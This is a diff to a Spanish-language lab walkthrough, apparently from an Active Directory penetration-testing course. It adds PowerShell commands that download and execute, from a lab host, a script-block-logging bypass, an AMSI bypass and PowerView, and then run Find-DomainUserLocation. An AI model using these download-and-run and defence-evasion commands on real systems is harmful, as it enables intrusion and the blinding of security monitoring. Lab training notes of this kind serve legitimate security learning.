@@ -406,5 +406,23 @@ El segundo comando omite el registro de bloques de script mejorado.
 
 Cargaremos *sbloggingbypas.txt* primero en la maquina
 ```shell
-[dc]
+[dcorp-ci]
+iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.97/sbloggingbypass.txt')
+```
+
+Y a continuacion cargaremos *Amsi-Byp.txy* para eludir *AMSI*
+```shell
+[dcorp-ci]
+iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.97/Amsi-Byp.txt')
+```
+
+Ahora tendremos que cargar y ejecutar *PowerView* y ejecutar *Find-DomainUserLocation*
+```shell
+[dcorp-ci]
+iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.97/PowerView.ps1')
+```
+
+```shell
+[dcorp-ci]
+Find-DomainUserLocation
 ```
